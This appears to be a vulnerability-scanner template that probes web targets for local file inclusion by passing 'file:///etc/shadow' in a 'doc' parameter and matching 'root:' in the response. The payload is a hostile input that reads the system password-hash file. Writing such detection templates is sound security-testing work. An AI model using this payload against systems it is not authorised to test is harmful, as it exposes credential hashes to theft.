id: lfi5-117
name: 'Wrapper file via doc'
severity: high
type: active
tags:
  - lfi
  - traversal
  - wrapper
description: 'Reads file via file wrapper'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      doc:
        - 'file:///etc/shadow'
    matchers:
      - type: word
        part: body
        words:
          - 'root:'
